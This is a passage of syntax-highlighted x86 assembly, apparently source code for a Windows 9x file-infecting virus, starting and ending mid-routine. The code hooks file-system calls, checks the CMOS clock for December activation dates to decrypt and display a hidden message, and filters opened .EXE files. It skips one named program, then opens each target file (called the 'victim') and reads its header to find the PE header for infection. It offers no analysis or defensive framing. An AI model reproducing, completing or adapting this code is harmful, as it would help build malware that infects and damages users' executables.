                     </span><span class="sc1">;+4 for have the parameter..y must skyp return ptr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">36</span><span class="sc0">  </span><span class="sc1">;if a file is open?.... hehehe</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">LEE_FILE</span><span class="sc0">

</span><span class="sc1">;;////it is optionals!!!</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">;if it is for stealth??</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Stealth</span><span class="sc0">
</span><span class="sc1">;;////it is optionals!!!</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">38</span><span class="sc0"> </span><span class="sc1">;if it is for stealth??</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Stealth</span><span class="sc0">


</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SALTO_A_OLD_IFS_INTERNO</span><span class="sc0">

</span><span class="sc5">LEE_FILE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;Activaction</span><span class="sc0">
</span><span class="sc1">;;;;;;;See if the date is for activation</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">;;;mes</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">    </span><span class="sc1">;;;dia</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">  

</span><span class="sc1">;;;;;DX=DAY:MONTH</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0112h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0312h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0512h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0712h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0912h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1112h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1312h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0"> 
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1512h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1712h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1912h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2112h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2312h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2412h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2412h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ACTIVO</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NO_ACTIVO</span><span class="sc0">

</span><span class="sc5">ACTIVO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_CONTFLAG</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_CONTFLAG</span><span class="sc4">],</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">noactperflag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_CONTFLAG</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_MSGC</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ya_esta_desencriptado</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
</span><span class="sc5">desencrp_MSGC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">desencrp_MSGC</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_MSG</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">105</span><span class="sc0">
</span><span class="sc5">desencrp_MSG</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">desencrp_MSG</span><span class="sc0">
        

</span><span class="sc5">ya_esta_desencriptado</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc5">PATCH8</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0"> 
        </span><span class="sc9">DW</span><span class="sc0">       </span><span class="sc2">0003h</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001h</span><span class="sc0">    </span><span class="sc1">;Get VM</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFFSET_ABS_MSG</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFFSET_ABS_MSGC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFFSET_ABS_REFDATA</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc5">PATCH9</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0"> 
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">17H</span><span class="sc0">   
        </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">noactperflag</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SALTO_A_OLD_IFS_INTERNO</span><span class="sc0">
</span><span class="sc5">NO_ACTIVO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;;Get the name of File</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;until the end of the name</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">SCASW</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NO_ES_PE_EXE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;Go to the beguin od the extencion</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0045h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PASO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0065h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PASO</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NO_ES_PE_EXE</span><span class="sc0">
</span><span class="sc5">PASO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0058h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PASO2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0078h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PASO2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NO_ES_PE_EXE</span><span class="sc0">
</span><span class="sc5">PASO2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0045h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ES_EXEexe</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0065h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ES_EXEexe</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NO_ES_PE_EXE</span><span class="sc0">

</span><span class="sc5">ES_EXEexe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;Dont infect the conagent.exe!!!</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0054h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">es_igual_T</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0074h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_es_igual_T</span><span class="sc0">

</span><span class="sc5">es_igual_T</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">no_es_igual_T</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">004eh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">es_igual_N</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">006eh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_es_igual_N</span><span class="sc0">

</span><span class="sc5">es_igual_N</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">no_es_igual_N</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0041h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">es_igual_A</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0061h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_es_igual_A</span><span class="sc0">
</span><span class="sc5">es_igual_A</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">no_es_igual_A</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0043h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">es_igual_C</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0063h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_es_igual_C</span><span class="sc0">
</span><span class="sc5">es_igual_C</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">no_es_igual_C</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NO_ES_PE_EXE</span><span class="sc0">    


</span><span class="sc1">;;;Pass unicoide name to ascii</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                   </span><span class="sc1">;is for pusha</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;;Address of ioreq</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc1">;;Address of ir_Path</span><span class="sc0">

</span><span class="sc1">;;Pass to ascii</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_file_EXE</span><span class="sc0">

</span><span class="sc5">buclecpy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">listocpy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">buclecpy</span><span class="sc0">
</span><span class="sc5">listocpy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;;set a Null to the end</span><span class="sc0">



</span><span class="sc1">;;ok it is a .EXE file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_file_EXE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;EAX the handle of victims</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OPEN_FILE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">malopen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;;save the handle in ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                                                                                                                                                                                   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">59</span><span class="sc0">        </span><span class="sc1">;;Get the NewHead</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">READ_FILE</span><span class="sc0">

</span><span class="sc1">;;i have:</span><span class="sc0">
</span><span class="sc1">;;EBX==&gt;HANDLE</span><span class="sc0">
</span><span class="sc1">;;DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE==&gt;ptr newhead</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
